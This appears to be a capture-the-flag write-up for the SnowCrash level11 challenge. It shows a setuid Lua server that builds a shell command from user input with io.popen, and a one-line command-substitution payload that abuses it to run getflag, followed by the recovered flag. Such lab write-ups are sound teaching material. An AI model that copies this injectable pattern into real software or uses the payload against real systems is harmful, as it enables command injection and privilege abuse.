
## level11
Here are the enumeration results
```
level11@SnowCrash:~$ file level11.lua
level11.lua: setuid setgid a lua script, ASCII text executable
```

We are presented with a lua file, here is the code.
```lua=
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Looks like the code is already running in a server of port 5151 on localhost, and it reads data from the body, put it through the hash function and sends a respose.

However, looking at the code, we can deduce that there is no point trying to crack the encryption since we cant inject anything into the response. We can however, use command substitution and output the result in a file, and thats what we did

```
`getflag > /dev/shm/flag`
```

we got the flag in `/dev/shm/flag` `fa6v5ateaw21peobuub8ipe6s`
